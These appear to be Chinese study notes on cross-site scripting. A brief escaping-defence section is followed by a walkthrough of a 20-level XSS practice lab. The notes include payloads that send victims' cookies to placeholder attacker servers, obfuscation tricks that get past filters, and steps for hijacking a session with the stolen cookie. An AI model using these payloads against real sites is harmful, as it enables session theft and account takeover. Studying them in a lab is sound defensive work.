#### 防御

```sh
1.将 5 个核心字符转换为 HTML 实体:
	< 变成 &lt;
	> 变成 &gt;
	& 变成 &amp;
	" 变成 &quot;
	' 变成 &#39;
2.HTML 属性必须加引号:
	<input value=用户输入>		#危险!
	<input value="用户输入">	#正确
	
3.在 href 或 src 属性中,检查开头:
	只允许：http://、https:// 或 / (绝对/相对路径)
	以 javascript: 或 data: 开头，直接清空或替换为 #
```

#### 示例

```sh
#测试
<script>alert(1)</script>		# 过滤,可尝试双写<scscriptript> 或大小写绕过
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
----------------------
#构造 Payload
#1:
<img src=1 onerror="var s=document.createElement('script');s.src='你的XSS平台地址?cookie='+ducoment.cookie;document.body.appendChild(s);">
#2:
<img src=x onerror="new Image().src='http://your-vps.com?cookie='+document.cookie">
#3:
<img src=x onerror="location.href='http://你的服务器IP:端口/?cookie='+document.cookie">
#4: btoa:base64编码
<img src=x onerror="new Image().src='http://你的服务器IP:端口/?data='+btoa(document.cookie);">

#其他
SVG 触发：<svg onload="new Image().src='你的地址?c='+document.cookie">
自动聚焦触发：<input autofocus onfocus="new Image().src='你的地址?c='+document.cookie">
----------------------
#说明
如果 document.cookie 被拦截，可以尝试用 :
document['cookie'] 
document['coo'+'kie']	#拼接绕过

#或者 String.fromCharCode 编码来绕过:
	#document.cookie
	String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101)	#ascii码
	#示例:
	<img src=1 onerror="e--val(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115...))">
	<img src=1 onerror="setTimeout(String.fromCharCode(110,101,119,32,73...))">
	<img src=1 onerror="Function(String.fromCharCode(110,101,119...))()">

	#生成ascii码方法:
	"你的代码".split('').map(c => c.charCodeAt(0)).join(',')	#F12控制台运行
----------------------
#成功后,修改cookie
Chrome 开发者工具 (F12) -> Application -> Cookies

===========================
#无需注册,查看请求url的网站:
https://Webhook.site
```

#### level

```sh
level-1:
	#页面代码:
	<input name="keyword" value="">
	#payload:
	<script>alert(1)</script> 
	
level-2:
#脚本被引号包裹
	#无法跨站,因为此代码被在value里面,被引号包裹,被当成字符串:
	<input name="keyword" value="<script>alert(1)</script>">
	#逃逸引号: 
	payload 1:
	"> <script>alert(1)</script>
	payload 2:
	" onmouseover="alert(1)
	
level-3:
# < > " 被转义 &lt;&gt;&quot;
#后端代码通常写为 htmlspecialchars($str)。在 PHP 中，如果不显式设置 ENT_QUOTES 参数，该函数不会转义单引号 '
	#payload:
	' onmouseover='alert(1)		#悬停触发
	' onclick='alert(1)			#点击触发
	' onfocus='alert(1)' autofocus='		#自动触发

level-4:
#后端代码使用 str_replace() 过滤掉了尖括号 < 和 >
#同leve-2,脚本内容会被双引号包裹,单引号无效,使用双引号
	#payload:
	" onmouseover="alert(1)

level-5:
#后端对 script 和 on 进行了过滤: s_cript o_n
#没有过滤 < > 和 "
	#payload:
	"><a href="javascript:alert(1)">click me</a>

level-6:
# href、src、script、on 都过滤了: hr_ef sr_c o_n scr_ipt
# 大小写没有过滤
	#payload:
	" Onmouseover="alert(1)

level-7:
#后端会将输入中的 script、on、href、src 等关键字直接删除
#双写绕过
	#payload:
	" oonnmouseover="alert(1)

level-8:
#后端对字符串和引号都进行了过滤
#页面有个 a 标签,输入会出现在 a 标签里		#添加友情标签功能
#<a> 标签的 href 属性支持 HTML 实体编码 (HTML Entity)。浏览器在点击链接前，会先对 href 内部的编码进行解码
	将 javascript:alert(1) 进行实体编码:
	原字符：j  编码：&#106;
	原字符：s  编码：&#115;
	#payload:
	javascri&#112;t:alert(1) 		#这里只对 p 进行了编码

level-9:
#同level-8,不过要求输入里有http://,如果无则返回不合法
#漏洞,只检查是否存在http://,并没要求在开头,可放最后,用//注释
	#payload:
	javascri&#112;t:alert(1)//http://

level-10:
#隐藏表单的提交,url后参数输入隐藏表单参数内容,可导致隐藏表单回显
	#payload
	&t_sort=" type="text" onmouseover="alert(1)		#需改变 type 的隐藏属性
	#最终结构:
	<input name="t_sort" value="" type="text" onmouseover="alert(1)" type="hidden">

level-11:
#同上,refer注入,之过滤了 < >
	#payload:
	" onmouseover="alert(1)" type="text"
	
level-12:
#同上,user-agent注入

level-13:
#同上,cookie注入

level-14:
#漏洞点在于：Web 应用在读取并展示图片的 EXIF 元数据（如作者、相机型号、描述等）时，未对这些数据进行过滤。如果攻击者在图片属性中植入恶意脚本，当系统解析该图片并回显 EXIF 字段时，脚本就会被执行。
	#构造payload流程:
	1. 随便找一张普通的 JPG 图片。
	2. 在 Windows 下右键点击图片 -> 属性 -> 详细信息。
	3. 在“备注”或“作者”等字段中输入 XSS Payload，例如：<img src=1 onerror=alert(1)> 或 <script>alert(1)</script>

level-15:
#js插件angular.min.js的的回显点 <span> 标签的 ng-include 属性
	#payload:
	?src='level1.php?name=<img src=1 onerror=alert(1)>'
	
level-16:
#空格、斜杠（/）和 script 被过滤为 &nbsp;
#使用  回车符（URL 编码为 %0a） 或 换行符（%0d） 来代替空格，浏览器依然能够解析
	#payload:
	<img%0asrc=1%0aonerror=alert(1)>
	#浏览器传参,后端进行url解码才行
	
level-17~18:
#embed 参数注入,略
level-19~20:
#flash漏洞:Flash 内部的 ActionScript 2.0 代码使用了 getURL 等危险函数
#使用 javascript:alert(1) 伪协议 
	#payload:
	?arg01=version&arg02="onmouseover=alert(1)"		#level-19
	#payload:level-20:
	?arg01=id&arg02=xss\"))}catch(e){alert(1)}//
		#说明:
		\"))：尝试闭合 Flash 内部调用的 JS 函数
		catch(e){alert(1)}：通过异常处理或直接拼接来执行 alert
		catch(e){alert(1)}：通过异常处理或直接拼接来执行 alert
```



